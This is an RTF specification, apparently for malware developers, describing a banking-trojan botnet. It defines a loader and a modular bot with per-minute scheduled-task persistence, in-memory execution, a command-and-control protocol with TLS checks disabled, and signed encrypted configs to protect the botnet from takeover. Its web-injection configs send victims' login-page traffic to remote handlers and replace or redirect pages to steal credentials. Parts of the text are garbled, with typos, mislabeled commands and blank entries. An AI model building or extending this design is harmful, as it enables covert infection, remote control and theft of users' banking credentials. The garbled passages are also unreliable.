{\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033{\fonttbl{\f0\fnil\fcharset0 Calibri;}{\f1\fnil\fcharset0 Courier New;}{\f2\fnil\fcharset0 Courier New CYR;}{\f3\fnil\fcharset0 Lucida Console;}{\f4\fnil\fcharset2 Symbol;}}
{\colortbl ;\red255\green0\blue0;\red0\green0\blue255;}
{\*\generator Riched20 10.0.22000}\viewkind4\uc1 
\pard\sa200\sl276\slmult1\highlight0\b\f0\fs22\lang9 Resident Lauder\par
\b0 Autorun - via the system scheduler. \par
\b 1.1 \b0 For Windows: startup not at system startup, but every minute. If you have autorun permission from SYSTEM at first startup, add a task to start it from SYSTEM. Otherwise, the task should be run by the current user. At each startup, check if an instance of the Laender is already running, using the mechanisms of named pipes (the rule of naming a pipe name is not stipulated).\par
\b 2. \b0 Keep communication with the server using the CS2 protocol.\par
\b 2.1 \b0 It is not necessary to support all commands. For the Lowder, you need to support: /0/, /1/, /5/, /10/, /14/,/23/, /25/,/42/\par
\b 2.2 \b0 The client id must be saved and not changed between machine restarts.\par
\par
\b Modular Bot\par
\b0 Autorun - via the system scheduler. \par
\b 1.1 \b0 For Windows: startup not at system startup, but every minute. If you have autorun permission from SYSTEM at first startup, add a task to start it from SYSTEM. Otherwise, the task should be run by the current user. At each startup, check if an instance of the Laender is already running, using the mechanisms of named pipes (the rule of naming a pipe name is not stipulated).\par
\b 2. \b0 Keep communication with the server using the CS2 protocol.\par
\b 2.1 The \b0 following commands should be supported: /0/, /1/, /5/, /10/, /14/, /23/, /25/, /30-32/, /41-43/, /62-63/.\par
\b 2.2 \b0 The client id must be saved and not changed between machine restarts.\par
\b 2.3 \b0 Mandatory verification of all digital signatures\par
\b 3\b0  There must be two versions of the bot at once: 32-bit and 64-bit. The 64-bit version of the bot should work on a 64-bit operating system. At the same time, the bot must be distributed as a single file, when running it detects the version of the system, pulls out the body of the desired version and runs it without saving to disk.\par
\b 4 \b0 A module system must work. The module is some DLL. Receiving a command to work with the module is done through incoming command 62, sending data after the execution of the module is done through command 63.\b\par
\b0\par
\b CS2 Protocol\par
1\b0  List of servers is specified by list ip:port (ip can be both ipv4 and ipv6). If port is even then interaction is via HTTP, if odd, then via HTTPS (certificate is self-signed, certificate checks should be disabled).\par
\b 2\b0  Work with the server is carried out through HTTP-requests. They can be either GET or POST. \par
\b 2.1\b0  Each URI contains three components separated by "/": group tag, client id, and command code. /<group-tag>/<clientid>/<ccode>/, where group-tag - group tag, clientid - client id, ccode - command code. \par
\b 2.1.1 \b0 A group tag is an arbitrary string consisting of characters (a-z) and numbers (0-9). The parameter is not case-sensitive.\par
\b 2.1.2 \b0 Client Id is a string consisting of two components separated by a dot. The first part is in the format <name>_XYYYYYYYY, where name is a name which can somehow identify the machine (computer name or username, depending on the type of operating system), X is a symbol indicating the type of system the client runs on (W - windows, L - Linux, A - android, M - Mac OS), YYYYYYYY - 3-7 digits containing major-version, minor-version and build of the operating system if available in the system (for example, for DLE 6.1 build 7600 it will be 617600). The second part contains 32 random characters 0-9, A-F. An example client id is QWERTY_W617600.11223344556677889900AABBCCDDEEFF. The parameter is not case sensitive.\par
\b 2.1.3 \b0 The command code is a number from 0 to 999.\par
\b 2.2\b0  The fourth and subsequent components in the URI, as well as the body of the request and response depend on the command code\par
\b 2.3 \b0 Commands can be outgoing and incoming, codes of outgoing and incoming commands cannot overlap. Outgoing command is a command whose code is specified in the request URI, incoming command is a command which came in response to outgoing command with code 1.\par
\b 3\b0  Sequence of work with the server\par
\b 3.1 \b0 It is necessary to check the server before work. If the server was checked less than 4 hours ago, the check is not necessary. Checking is done by requesting a file named "spk". The file from the server is requested via /5/. The file is a server certificate (see point 10.2) inside the universal signed config\par
\b 3.2 \b0 After a successful test, the command request session must be initialized. The initialization is done via /0/\par
\b 3.3 \b0 After successful initialization a cycle of 100 consecutive queries /1/ begins.\par
\b 3.4 \b0 If an error occurs as a result of sending an HTTP request or receiving an HTTP response, the request must be repeated. A successful result is when the server responds with HTTP codes 200, 403 or 404.  If there was no successful result after 3 retries, the retries are done after 15 seconds. Any other code means a failure in sending a request or receiving a response. \par
If the /1/ command request failed after all repetitions, the client must take the next server from the list and start the process all over again: server check, command /0/ and 100 commands /1/. If the client reached the end of the list of servers, it must start over and so on to infinity. If the 100 commands /1/ are successful, still take the next server and repeat the process.\par
\b 4 The \b0 main config of the client is flashed into it when it is created. At the same time during its work on the target machine there is the possibility of updating it. The main config has an inherent property - version. The version of the main config is an arbitrary 32-bit unsigned number. At the same time, updating the config on the client is possible only if the version of the new config is strictly greater than the previous one. A detailed description of the config in point 10.1\par
\b 4.1\b0  The request for a new main config is made through the outgoing command /23/ every 3 hours.\par
\b 5\b0  The digital signature of the server in the current implementation is not used, instead it is used a stub that gives the string "1234567890" instead of the signature\par
\b 6 \b0 The digital signature of the config is a 384-bit ECDSA digital signature with SHA2-384 hashing algorithm. The signature standard must be compatible with the Microsoft BCRYPT_ECDSA_P384_ALGORITHM algorithm from the CNG library.\par
\b 7 \b0 Outgoing commands\par
\b 7.1\b0  /0/ - initializes the cycle for receiving incoming commands. It has 5 parameters. Request format for command /0/:\par
\f1 /<group-tag>/<clientid>/0/<system-version>/<client-version>/<client-self-ip-address>/<devhash>/<token-string>/\f0\par
system-version - name of the operating system with version, service package and architecture (32, 64 bit) \par
client-version - client version, arbitrary number greater than 1000\par
client-self-ip-address - client's own external ip-address (ipv4 and ipv6) in string representation. It is obtained by the client itself by means selected at the developer's discretion. \par
token-string - a random string of 16 to 32 characters. Can contain large and small English characters and numbers from 0 to 9. Case sensitive\par
\f1 devhash \f2 - \f0 hardware identifier. An arbitrary HEX string (characters 0-9, A-F) representing a 256-bit hash that depends on the hardware or operating system the client is running on. The devhash calculated several times on the same machine must always be the same.\par
The server response is a file (content-type: binary) with the following content:\par
\f1 /1/<group-tag>/<clientid>/<token-string>/<binary-content-length>/\\r\\n<binary-content>\\r\\n<server-sign>\f0\par
binary-content-length - the length of the binary-content block in bytes\par
binary-content is a block of binary data. This is an advanced server config\par
server-sign is the server's digital signature, which includes the content of the response from the first byte to the second \\r\\n (the \\r\\n characters are included in the digital signature)\par
\b 7.2\b0  /1/ - request for an incoming command. The command has one parameter - a random string, which will be duplicated in the parameters of the incoming command. It is identical to the token-string parameter from the /0/ command. Incoming commands are described in more detail in paragraph 8\par
\b 7.3 \b0 /5/ - request a file or config from the server. The command has one parameter - the file name. The file name can contain English characters and numbers, the file name is case sensitive. In response to /5/ server gives file (content-type: binary). Example of request with code 5 is /test1/QWERTY_W617600.11223344556677889900AABBCCDDEEFF/5/spk/. \par
If it fails, the server returns a 403 or 404 code.\par
\b 7.4\b0  /10/ - the report of the executed incoming command. Query format for command /10/:\par
\f1 /<group-tag>/<clientid>/10/<incode>/<cmd-id>/<result-code>/\f0\par
incode - code of the executed incoming command\par
cmd-id - the identifier of the executed incoming command.\par
result-code - the result code of the executed incoming command. A number from 0 to 999.\par
The server always responds with "/1/" (Content-type: text/plain).\par
\b 7.5 \b0 /14/ - saving the key-value pair to the servers. \par
Request format:\par
/<group-tag>/<clientid>/14/<name>/<value>/0/\par
name - key. An arbitrary string with English uppercase and lowercase letters, numbers, and the symbols point, "+" and "-".\par
value - value. Arbitrary string, all special characters must be urlencoded.\par
The third parameter is always zero.\par
The response to this command is always the same: HTTP 200, Content-type: text/plain, the content of the response body "/1/"\par
\b 7.6\b0  /23/ - issuing the main config to the client\cf1 . \cf0 It has only one additional parameter - the version of the current client config. \par
An example of a customer request:\cf1\par
\cf0\f1 /<group-tag>/<clientid>/23/<current-config-version>/\cf1\f0\par
\cf0 current-config-version - the current version of the config.\par
\cf1\par
\cf0 Example of a server response:\par
\f1 /23/<group-tag>/<clientid>/<config-version>/<binary-content-length>/\\r\\n\par
<binary-content>\\r\\n\par
<server-sign>\f0\par
binary-content - binary content of the config\par
config-version - config version in binary-content \par
binary-content-length - the length of the binary-content in bytes written as a string\par
\par
If there is no file on the server that meets the conditions of the client, the server should reply with an HTTP 404. The binary-content is the client's new main config. The client should check the main config and extract the version from it. The version that is stored in it must be strictly equal to the version that is specified in the config-version parameter of the server response. This version, however, must be strictly greater than the current version of the config used by the client. After all the checks the client should unconditionally and immediately start using the new main config.\par
The request for a new main config is made by the client no more often than once every 4 hours.\cf1\par
\par
\cf0\b 7.7\b0  /25/ - request a new body. The command has no parameters.\par
An example of a customer request:\cf1\par
\cf0\f1 /<group-tag>/<clientid>/25/<token-string>/\cf1\f0\par
\cf0\f1 token-string \f0 -identical to the parameter in /1/ \par
\cf1\par
\cf0 Example of a server response:\par
\f1 /25/<group-tag>/<clientid>/<token-string>/\\r\\n\par
<link>\\r\\n\par
<server-sign>\cf1\f0\par
\cf0\par
If there is no link that meets the conditions of the client, the server replies with an HTTP 404. The link issued by the server is designed according to all URL rules. At this link there is a new body (executable module) for the client. This file is packed into universal signed config. After all checks this file should replace your own executable module. \par
Request a new body by the client no more than once every 4 hours. To restart immediately and not after body update - the question is at the developer's discretion.\cf1\par
7.8 /60/\par
\cf0\b 7.9\b0  /63/ - sending module data.  The command has the following parameters: module name, ctl to module, result string ctl\fs20 , \fs22 auxiliary tag, ctl_OutData. And the result string ctl\fs20 , \fs22 auxiliary tag and ctl OutData are optional. The parameter "ctl_OutData" is a block of arbitrary binary data and is passed to the body via multipart/form-data, the parameter name inside multipart/form-data is "noname". If ctl_OutData is present in the request, then the request is passed via POST.\cf1\par
\cf0 An example of a customer request\par
\f1 /<group-tag>/<clientid>/63/<module name>/<ctl>/<ctl-result-string>/<aux-tag>/\cf1\f0\par
\cf0 module name - the string consists only of English letters, the maximum length is 64 characters\par
ctl - the string consists only of English letters and numbers, the maximum length is 64 characters\par
ctl-result-string - base64-formatted string\par
aux-tag - auxiliary tag, string consists only of English letters and numbers, maximum length is 128 characters. The field is necessary for easy search in the table, it is assumed that there will be an index on this column in the table.\cf1\par
\cf0 ctl_OutData - is passed in the body of POST request and contains a block of arbitrary binary data. The maximum size is 32 MB. \cf1\par
\cf0 The server response is either always 200 - "/1/", or 403 if the client is not in the database or he sent /0/ too long ago\par
\b 7.10\b0  /64/ - module event report. The command has the following parameters: module name, event name, event information\fs20 , \fs22 auxiliary tag, event data. Event info\fs20 , \fs22 auxiliary tag and data are optional. Event info is a UTF-8 encoded string with a maximum length of 64 KB (bytes, not characters). The data parameter is a block of arbitrary binary data and is passed to the body via multipart/form-data, the parameter name within multipart/form-data is "data" and the name of the event info parameter is "info". If a request contains data or information about an event, then the request is sent by POST.\cf1\par
\cf0 An example of a customer request\par
\f1 /<group-tag>/<clientid>/6/<module\f2 4\f1  name>/< \f2 event-name>/<aux-tag>/\cf1\f0\par
\cf0 module name - the string consists only of English letters, the maximum length is 64 characters. It is assumed that there will be an index on this column in the table.\par
event-name - the string consists only of English letters and numbers, the maximum length of 64 characters. \par
aux-tag - auxiliary tag, string consists only of English letters and numbers, maximum length is 128 characters. The field is necessary for easy search in the table, it is assumed that there will be an index on this column in the table.\cf1\par
\cf0 The server response is either always 200 - "/1/", or 403 if the client is not in the database or he sent /0/ too long ago\par
\par
\b 8\b0  Incoming commands are sent by the server in response to the query /1/. The server responds with a file (content-type: binary). The file has the following format:\par
\f1 /<incode>/<group-tag>/<clientid>/<token-string>/<cmd-id>/\\r\\n<command-params>\\r\\n<server-sign>\f0\par
incode - incoming command code\par
token-string - the string copied from the /1/ command parameter from the GET request\par
cmd-id - the identifier of the issued command, an arbitrary string with large and small English characters, numbers from 0 to 9 and symbols -,+,dot,#. Case sensitive\par
command-params - any string with parameters (must not contain \\r\\n characters, as this indicates the end of the string)\par
server-sign is the server's digital signature, which includes the content of the response from the first byte to the second \\r\\n string translation (\\r\\n characters are included in the digital signature)\par
If there is no incoming command for the client, the response is a string of 3 characters "/1/", Content-type: text/plain.\par
\b 8.1 \b0 /30/ - system restart. \cf1\par
\b 8.2\b0  /31/ \par
\b 8.3 \b0 /32/\cf0\par
\cf1\b 8.4\b0  /41/ - launching the executable file\cf0\par
\b 8.5\b0  /42/ - start the executable file according to the alternative scheme. As a parameter of the command there is a line with the configure of launching the file according to the alternative scheme (point 10.8).\cf1\par
\cf0\b 8.11\b0  /62/ - command to module.  The command parameter consists of three components separated by a space: module name, module command (ctl) and module command argument (arg). The module name can only contain English letters (case insensitive), the command to the module can contain English letters (case insensitive) and numbers, the command argument is an arbitrary block of data in base64 format.\par
Example, the incoming command parameter 62:\par
\f1 testMod status ZnVmYWlrYQ==\f0\par
where "testMod" is the name of the module, "status" is the command to the module, and "ZnVmYWlrYQ==" is the argument to the module.\par
The "start" and "release" commands are reserved\cf1\par
8.12 /70/\par
8.13 /71/\par
8.14 /666/\par
\cf0 8.16 Responses to incoming commands\par
8.16.1 Code 1 - successful command execution\par
8.16.2 Code 2 - Incorrect command parameter\par
8.16.3 Code 3 - Invalid digital signature of the config\par
8.16.4 Code 4 - it is not possible to download the file from the link\par
8.16.5 Code 5 - file is damaged\par
8.16.6 Code 6 - When running a file for execution, a system function failed\par
\par
\b 9 \b0 The Universal Signed Configure is a container for all files that require authentication. It consists of a 48 byte header and an encrypted portion. \par
The point of signing a config is to protect against hijacking the control of the entire botnet. Hijacking the control of a C&C server or a pad (e.g., a hoster, or a rat) allows you to tamper with the list of C&C pads in the config, and hijack the control of the network. If the config is signed, then in addition to hijacking the server, you also need to mine the keys.\par
\b 9.1 \b0 The 48-byte header is used to calculate Keu, IV for decrypting data. To calculate the Keu for decrypting AES256-CBC, you need to do the following calculations: take the first 32 bytes of the header, calculate its SHA256-hash and add to the end of these 32 bytes, we get 64 bytes, again calculate SHA256-hash of these 64 bytes and add to the end, then again calculate SHA256-hash of these 96 bytes and add to the end and repeat until the data size reaches 4096 bytes. The SHA256 hash from the resulting data block of 4096 bytes will be the Key for AES256-CBC.  \par
To calculate IV for AES256-CBC decryption, you need to do the following calculations: take 32 bytes of the header from 16 bytes up to the end (numbering bytes from zero), calculate its SHA256-hash and add to the end of these 32 bytes, we get 64 bytes, again calculate SHA256-hash from these 64 bytes and add to the end, then calculate SHA256-hash from these 96 bytes and add to the end and repeat until data size reaches 4096 bytes. The first 16 bytes of the SHA256 hash from the resulting data block of 4096 bytes will be IV for AES256-CBC.  \par
Thus, we get the following calculation scheme (the "+" operation is the concatenation of binary blocks):\par
Key\par
\f1 data0 = header[0:31]\par
data1 = data0 + sha256(data0)\par
data2 = data1 + sha256(data1)\b\par
\b0 data3 = data2 + sha256(data2)\par
data4 = data3 + sha256(data3)\par
...\par
data127 = data126 + sha256(data126)  \par
/size \f2 data127 - 4096 bytes\par
Key = sha256(data127)  \par
\f0\par
IV \par
\f1 data0 = header[16:47]\par
data1 = data0 + sha256(data0)\par
data2 = data1 + sha256(data1)\b\par
\b0 data3 = data2 + sha256(data2)\par
data4 = data3 + sha256(data3)\par
...\par
data127 = data126 + sha256(data126)   \par
/size \f2 data127 - 4096 bytes\par
IV = sha256(data127)[0:15]\f0\par
As a result, we have a 256-bit Key and a 128-bit IV for the AES256-CBC decryption.\b\par
9.2\b0  The encryption part is a multiple of 16 bytes, it is an encrypted block using the AES256-CBC algorithm.\par
\b 9.3 \b0 Before encryption the data is augmented so that its length is a multiple of 16 bytes. The alignment is done according to PKCS7 padding (16). \par
\b 9.4 \b0 Before encryption the original data can be optionally compressed using the LZO algorithm. Before encryption, the data is supplemented with an 8-byte chipper at the front and a digital signature of the config (ECDSA384, SHA-2-384 hashing algorithm) at the end, and the 8-byte header added at the front is included in the digital signature. The 8-byte header consists of two DWORD values: the first value is the size of the original data, the second value is the bit flags.\par
\b 9.5 \b0 So the algorithm for creating a universally signed config is as follows:\par
\b 9.5.1\b0  First, the original data is compressed as needed. \par
\b 9.5.2 \b0 Prepared original data is appended at the front with an 8-byte header with data size (if compressed, the size of the compressed data) and flags. The digital signature of the config (ECDSA384/SHA384, the 8-byte header added from the front is appended to the digital signature)\par
\b 9.5.3 \b0 The resulting data block is then appended so that it is a multiple of 16 bytes in length using the PKCS7 padding (16) algorithm. \par
\b 9.5.4\b0  A 48 byte block of random data is generated.\par
\b 9.5.5\b0  Based on the block generated in section 9.5.4, Key and IV are calculated\par
\b 9.5.6 \b0 The data obtained in 9.5.3 are encrypted using the AES256-CBC algorithm. \par
\b 9.5.7 \b0 To the block generated in 9.5.4 is added at the end the data received as a result of encryption in 9.5.6\cf1\par
\cf0\b 10 \b0 Configurations\par
\b 10.1 \b0 Basic Client Configuration\par
This is an XML text file inside the universal signed config (item 9). It contains the group tag, the config version, the list of servers and the names of static and dynamic injector configs. An example of the main client config:\par
<mcconf>.\par
<ver>14,000</ver>\par
<gtag>test2</gtag\par
<servs>\par
<srv>1.2.3.4:443</srv>\par
<srv>5.6.7.8:443</srv>\par
...\par
<srv>51.62.71.83:443</srv>\par
</servs>\par
<stinj>name1</stinj>\par
<dyinj>name2</dyinj>\line <smst>name3<smst>\par
</mcconf>.\par
The main client config is always inside the universal signed config.\par
\b 10.2\b0  The server certificate is a text XML file with its validity (in future implementations other data is possible).\par
Example of a server certificate:\par
<ssert>.\par
<expir>1451069714</expir>\par
</ssert>\par
The expir tag contains the date after which the certificate ceases to be valid. The date is specified in the EPOCH time format. Working with a server with an invalid certificate is forbidden.\par
The server certificate is always inside the universal signed config.\par
\par
\b 10.3 \b0 Extended server config is an XML text file with its validity period (in future implementations there may be other data) and addresses of additional servers. The current implementation does not use any additional servers. Only validity check of config is required.\par
<servconf>\par
<expir>1451069714</expir>\par
<plugins>\par
<psrv>2.3.4.5:443</psrv>\par
<psrv>21.31.41.51:443</psrv>\par
</plugins>\par
<datapost></datapost>\par
</servconf>\par
The expir tag contains the date after which the extended server config ceases to be valid. The date is specified in EPOCH time format. Working with the server with an invalid certificate is forbidden.\par
The plugins tag contains a list of servers where modules are stored. Each of them is a server that supports only one command /5/. All modules must be requested from them. If there is no <plugins> tag in the advanced server config, then the bot will not support modules at all.\par
The advanced server config is always inside the universal signed config. \par
\b 10.4 \b0 Dynamic injections configuration is an ANSI-encoded XML text file which contains rules for handling HTTP responses from servers. The config describes the list of http(s)-link masks which should be processed, handler address and additional flags. \par
The configuration is organized as an array of elements in <igroup> tags.  Each <igroup> contains an unlimited number of elements in the <dinj> tags.  Each <dinj> element describes the rule of HTTP-response processing, it contains the reference mask, the address of the handler and additional flags: whether to send the sought http-request and priority. The link mask is located in tag <lm> in the attribute "value", the address of the handler in tag <hl>, whether to send http-request in tags <sq> and priority <pri>. \par
The parameter in the <sq> tag contains a non-negative numeric value. If it is equal to zero then you should not send HTTP request to HTTP request handler, if it is equal to one then the request header only should be sent to handler, if it is equal to 2 then the whole request should be sent to handler. Parameter in <sq> tag can be absent at all, in this case it is equal to zero.\par
The priority in the <pri> tag contains a non-negative numeric value. If the priority is not specified, its value is equal to the maximum positive 32-bit value (signed int) - 2 147 483 647. A priority value of zero is allowed.\par
The handler address is the http link of the handler on the remote server. The link is always prefixed with http:// or https://.  If the prefix is https:// you must use HTTPS to communicate with the handler.\par
A reference mask is some expression that contains an asterisk, a question mark and square brackets "[]". The asterisk stands for any sequence of characters, including the empty one. A question mark indicates any single character. Square brackets list single characters, for example [jeu] - it can only be replaced by one of the three characters "j", "e" or "u". , "e" or "u", [?] - only question mark character, [[] - only opening square bracket, [*] - only asterisk character, [[*] - asterisk or opening square bracket.\par
Example: q[\f1 abc]erty[?]u[]uu??88]88*\par
qaerty?u[uuzz88]88444 \f0 - fits\par
\f1 qbertysu[uuzz88]88444 \f0 - does not fit\par
\f1 qcerty?u[uuz88]88 \f0 - does not fit\cf1\par
\cf0\f1 qaerty?u[uuz?88]88 \f0 - fit\par
\f1 qrerty?u[uuz?88]88 \f0 does not fit\par
\f1 qaerty?u!uuz?88]8811 \f0 does not fit\par
The link mask never includes the http(s):// prefix and the link you are looking for is checked without this prefix.\par
An example of a dynamic injector config:\par

\pard\sa200\sl240\slmult1\f3\fs20 <igroup>.\par
<dinj> \par
<lm value="*/logon/*"/>\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{http://14.25.36.47/test2.php}}}}{\cf2\ul\f3\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{<}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{/hl}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{>}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{<}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{/dinj}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{>}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "http://14.25.36.47/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{ }}}}\cf0\ulnone\f3\fs20\par
</igroup>.\par
<igroup>.\par
<dinj> <lm>*test*.com/qwerty[?]*</lm>\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{https://1.2.3.4/test2.php}}}}{\cf2\ul\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{<}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{/hl}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{>}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{<}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{/dinj}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl%3E%3C/dinj"}}{\fldrslt{>}}}}\cf0\ulnone\f3\fs20\par
<dinj> \par
<lm value="?? site.net/cderfv.asp*">\par
\par
<lm>.\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl"}}{\fldrslt{https://1.2.3.4/test2.php}}}}{\cf2\ul\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl"}}{\fldrslt{<}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl"}}{\fldrslt{/hl}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test2.php%3C/hl"}}{\fldrslt{>}}}}\cf0\ulnone\f3\fs20\par
<pri>1</pri>\par
<sq>1</sq>\par
</dinj>.\par
<dinj> \par
<lm>[abcdef]wert[1234567890].com/papka/userprofile.php</lm>\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test.php%3C/hl"}}{\fldrslt{https://1.2.3.4/test.php}}}}{\cf2\ul\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test.php%3C/hl"}}{\fldrslt{<}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test.php%3C/hl"}}{\fldrslt{/hl}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "https://1.2.3.4/test.php%3C/hl"}}{\fldrslt{>}}}}\cf0\ulnone\f3\fs20\par
<pri>10</pri>.\par
</dinj>.\par
</igroup>.\par
<igroup><dinj \par
<lm>*/sitelogin/*</lm>\par
<hl> {\cf2\ul{\field{\*\fldinst{HYPERLINK "http://41.24.53.64:8089/test.aspx%3C/hl"}}{\fldrslt{http://41.24.53.64:8089/test.aspx}}}}{\cf2\ul\f3\fs20{\field{\*\fldinst{HYPERLINK "http://41.24.53.64:8089/test.aspx%3C/hl"}}{\fldrslt{<}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "http://41.24.53.64:8089/test.aspx%3C/hl"}}{\fldrslt{/hl}}}}{\f3\fs20{\field{\*\fldinst{HYPERLINK "http://41.24.53.64:8089/test.aspx%3C/hl"}}{\fldrslt{>}}}}\cf0\ulnone\f3\fs20\par
<pri>45</pri><sq>2</sq>\par
<dinj> </igroup>\f0\par

\pard\sa200\sl276\slmult1\fs22 In this example, one igroup has three dinjs, the other two have one dinj each.\par
Additional tags may be specified inside the lm tag, indicating additional conditions for using the link or ignoring it.\par
ignore_mask - ignore if the link matches the mask specified in the value attribute. If multiple ignore_mask tags are specified, the link will be ignored if it matches at least one of those tags.\par
ignore_header - ignore if the response contains a header that matches the header and value attributes. If more than one ignore_header tag is specified, the link will be ignored if it matches at least one of those tags. Values in header and value attributes can be specified as masks.\par
require_header - additional check on the header, if the response contains a header that matches the header and value attributes, it will be sent for processing. If several require_header tags are specified, the link will be accepted only if it \b matches all of \b0 them. Values in header and value attributes can be specified as masks.\par
<dinj> \par
  <lm value="example.com/*">\par
    <ignore_mask value ="*.css"/>\par
    <ignore_mask value ="*.rar"/>\par
    <ignore_header header="content-type" value="text/plain"/>\par
   <require_header header="content-lang" value="*"/>\par
  </lm>.\par
  <hl value="test.net/handler.php">\par
</dinj>. \par
In the specified config snippet, the link example.com/assetst/test.css will be ignored, and the link example.com/assetst/test.html will be processed only if the server response contains a content-lang chider.\par
\b 10.4.1 \b0 Processing of HTTP response starts only after receiving its full content from server (in AfterReceiveResponse collab in browser interceptor code). If a request link which receives a response fits several <dinj> elements \ul in different \ulnone <igroups> (at least one in a separate <igroup>), then such a link should be skipped without processing. \par
After it has been fully received, a POST request should be sent to the handler address. If there are multiple <dinj> elements with a mask that satisfy the given link and they \ul all belong to the same \ulnone <igroup>, they should be queried one by one in ascending order of priority (the lowest-priority handler goes first). If there are more than one handler with the same priority, this situation must be resolved at the developer's discretion. It is understood that the config builder must take care that such situations do not arise.\par
The body of the POST request is in nultipart/form-data format. It must contain the following elements:\par
\i sourcelink \i0 - the full search link with the prefix https:// or http:// (if there is no way to find out which protocol, then always put https://) in ANSI encoding.\par
\i sourcequery \i0 - the http request being searched for, depends on the value in the sq parameter in <dinj>. The parameter may not exist if the value in the sq parameter is zero.\cf1\par
\cf0\i sourcehtml \i0 - the http response you are looking for. Full server response from beginning to end with all hitters, \ul unchanged\ulnone , in the encoding you are looking for.\par
Besides the parameters in the body, the following parameters must be specified in the request URI in the format urlencode:\line cid - clientid identifier, clientid as a string (see point 2.1.2)\par
group - customer group tag as a string.\cf1\par
\cf0 Handler response:\par
\i 200\i0  - handler changed the page and the response body contains the new changed server response with all the handlers, which should be substituted for the browser. No other handlers should be called.\par
\i 303\i0  - handler has not changed the page and still allows other handlers to be accessed, if any.\par
\i 304\i0  - Handler did not change the page and prohibits access to other handlers \par
All other codes should be treated as response 303, after which the given <dinj> element (or some object or structure in memory which describes the given <dinj> element) should be deactivated for 30 minutes and not participate in processing in any way. The deactivation must be local only to the current process.\par
\b 10.5 \b0 The static injections configuration is an ANSI-encoded XML text file which contains rules for handling HTTP responses from servers. The config describes a list of redirects. \par
Unlike dynamic injections, static injections are at a lower level and block http requests to the original server and completely replace the http responses (if any) of the original server.\par
The config describes a list of static injectors. The list of static injectors is specified in the <slist> tag. The <slist> tag contains a list of elements in the <sinj> tags. Each element sinj contains: the triggered mask in the tag <mm>, the link to which the injection <sm> will be triggered, the name of the handler <srv>, the new value of the host field in the <nh> query headers.  The sm tag is optional, in this case it is assumed to be equal to the content of the mm tag.\par
Each static injector can be in three states: "ready", "on" and "off". Initially, it is in the "ready" state and stays in this state until the link specified in the sm tag is clicked. As soon as the link is clicked, the static injector switches to the "on" state.  An inject can move to the "on" state only from the "ready" state. Inject can go to the "ready" state only from the "off" state\par
It is implied that the decision to switch the injector from the "ready" state to the "on" state is made in the CheckURL colbeck. The decision about switching the injector from "on" to "off" state is made in the AfterReceiveResponse colbeck. \par
Triggering mask (tag mm) - mask identical to the one in the configuration of dynamic injections. All requests matching this mask should be sent to the server handler\par
Reference mask on which the injector will be triggered or just an inclusion mask (sm tag or mm tag) - the mask of the link when the injector goes from the "ready" to the "triggered" state\cf1\par
\cf0 Server handler (srv tag) - ip:port value pair which points to the handler server. If the port value is even, it works without encryption (HTTP), if the port is odd, it works over SSL/TLS (HTTPS).\cf1\par
\cf0 New host value (nh tag) - the host field value to replace the original host field value in the outgoing request header.\par
An example of a config:\par
\f1 <slist>. \par
<sinj>\par
<mm>site.com/*</mm>\par
<sm>site.com/loginpage</sm>\par
<nh>othersite.com</nh>\par
<srv>11.22.33.44:80</srv>\par
</sinj>. \par
<sinj> \par
<mm>qwerty1.net/papka2/*</mm>\par
<nh>zxc.org</nh>\par
<srv>1.2.3.4:443</srv>\par
</sinj>.  \par
<slist>. \f0\par
\par
\b 10.5.1 \b0 As the simplest analogy to static injections we should consider redirecting some pages. So, let's say we are in the BeforeSendRequest column and after checking the link from all the injectors which are in the "on" state, it becomes clear that the link fits some injector, then we need to redirect the request to the server handler. \par
To redirect it, you need to copy the outgoing request, change the host field in the copy to the one specified in the config tag "nh", add "X-Forwarded-for" header with its own external ip-address, and "clientinfo" header which will contain first the client group tag and then with a space its full clientid, oh. After these modifications, you have to send the request to the handler server. If the server port is even, then via SSL/TLS. It is recommended to send the request asynchronously or just in a separate thread. \par
